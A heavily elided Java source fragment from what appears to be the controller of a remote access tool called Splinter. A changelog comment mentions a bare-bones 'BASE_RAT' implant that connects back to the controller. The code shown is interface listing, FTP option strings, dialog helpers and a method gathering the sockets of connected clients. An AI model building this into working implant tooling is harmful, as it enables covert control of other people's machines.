...
public class Drivers 
{
	...
	public static final String LISTEN_ON__ALL_INTERFACES = " * * * * * LISTEN ON ALL INTERFACES * * * * *                                                                              ";
	...
	public static final String 	ftp_option_SetPrimaryFTP_Interface = "Set Primary FTP Interface",
								ftp_option_SetFTP_FileHive = "Set FTP FileHive",
								ftp_option_SpecifyFTP_Address = "Manually Specify FTP Address";
	
	public static final String [] arrFTP_Options = new String[]{"Options                                                                           ", ftp_option_SetPrimaryFTP_Interface, ftp_option_SetFTP_FileHive, ftp_option_SpecifyFTP_Address};
	 ...
	 * ...    (IT'S BEEN A WHILE)
	 * 1.550: Updating networklistener module, allowing to establish listeners on all interfaces, hopefully will finish with inclusion of BASE_RAT, the bare bones implant that will make it easier for others to add custom features to your implant and connect back to Splinter Controller or use as standalone for other controllers
	 */
	...
	*************************************/
	...
	public static boolean refreshNetworkInterface(JComboBox jcbToPopulate, boolean enable_listen_on_all_interfaces_option)
	{
		try
		{
			//
			...
			LinkedList<NetworkInterface> alNetworkInterfaces = MapNetworkInterface.listInterfaces();
			...
			//check if we're to add an add all interfaces option
			if(enable_listen_on_all_interfaces_option)
			{
				jcbToPopulate.addItem(LISTEN_ON__ALL_INTERFACES);
			}
	...
	public static String jopInput(String title, String message)
	{
		return jop_Query(message, title);

	}
	
	/**
	 * actually, return linked list of printwriters of the connected sockets to transmit data out to
	 */
	public static LinkedList<PrintWriter>getList_of_connected_sockets()
	{
		try
		{
			LinkedList<PrintWriter> list = new LinkedList<PrintWriter>();
			
			for(int i = 0; Drivers.alTerminals != null && i < Drivers.alTerminals.size(); i++)
			{
				try
				{
					list.add(Drivers.alTerminals.get(i).pwOut);
				}
				catch(Exception e)
				{
					continue;
		...
		{
			Drivers.eop("getList_of_connected_sockets", strMyClassName, e, "", false);
		}
	...
	/**
	 * Given an array of input selections, return the index selected. -1 if user cancels
	 * @param list
	 * @return
	 */
	public static int jopQueryJComboBox(String title, String [] list)
	{
		try
		{
		...
		{
			Driver.eop("jopQueryJComboBox", "Drivers", e, "", false);
		}
